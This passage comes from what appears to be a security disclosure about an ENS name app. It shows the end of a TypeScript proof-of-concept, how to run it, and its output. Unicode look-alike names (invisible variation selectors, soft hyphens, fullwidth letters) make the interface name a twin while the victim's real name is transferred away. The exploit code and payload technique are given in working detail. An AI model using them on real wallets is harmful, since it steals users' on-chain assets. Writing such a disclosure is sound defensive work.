  // Victim "transfers displayed" — app uses tokenId(getLabel(displayed))
  const appTokenId=await tokenIdOf(appLabel)
  await wait(await wallet('victim').writeContract({address:ETH_REGISTRY,abi:REGISTRY,functionName:'safeTransferFrom',args:[victim,sink,appTokenId,1n,'0x']}))

  const res={ uiSaid:`Transfer ${displayed}`, realMovedToSink:await owns(sink,realId), victimStillOwnsReal:await owns(victim,realId), victimStillOwnsTwin:await owns(victim,twinId) }
  console.log('RESULT:',res)
  const pass=res.realMovedToSink && !res.victimStillOwnsReal && res.victimStillOwnsTwin
  console.log(`VERDICT: ${pass?'EXPLOITED':'NOT EXPLOITED'} — UI named the twin; the REAL name moved.`)
  if(!pass) process.exit(1)
}
main().catch(e=>{console.error(e);process.exit(1)})
```

{% endcode %}

Run (variation-selector payload; the twin `wal️let.eth` renders as `wallet.eth`):

```sh
ANVIL_RPC_URL=http://127.0.0.1:8545 PRESET=vs16 \
  pnpm --filter @ens-apps/e2e exec tsx scripts/onchain-poc.ts
```

Observed:

```
payload            : "embedded variation selector U+FE0F (invisible)"
REAL (victim owns) : wallet506951
TWIN raw label     : "wal️let506951"  (codepoints: U+77 U+61 U+6c U+fe0f U+6c U+65 U+74 …)
displayed          : wal️let506951.eth
getLabel(displayed): wallet506951   == REAL  <-- retargets to victim name
isAvailable("wallet506951")   = true
isAvailable("wal️let506951")  = true            <- registrar treats the twin as a distinct, available name
airdrop twin -> victim: victimOwnsReal=true victimOwnsTwin=true
RESULT: {
  uiSaid: 'Transfer wal️let506951.eth',
  realMovedToSink: true,          <- the REAL name moved
  victimStillOwnsReal: false,     <- victim lost the real name
  victimStillOwnsTwin: true       <- the twin every screen named is untouched
}
VERDICT: EXPLOITED — UI named the twin; the REAL name moved.
```

The same script run with `PRESET=soft` (soft hyphen U+00AD) and `PRESET=fw` (fullwidth `ｎｉｃｋ.eth`) both print `EXPLOITED` with the identical ownership outcome. A plain capital-letter twin (`Wallet.eth`) also reproduces `EXPLOITED`.

### What the three PoCs establish together

1. **Retarget is real and universal** (A): the write target is `getLabel(displayed)`, not the displayed name, for 3,507/3,507 admitted payloads.
2. **The victim's approval is against the wrong name** (B): the renew calldata the victim signs renews the attacker's label; the transfer moves the real name's token — while the description says the twin.
3. **On-chain outcome is loss** (C): the displayed twin stays with the victim and a different real name moves to the recipient — executed end-to-end on a Sepolia fork across four payload classes.
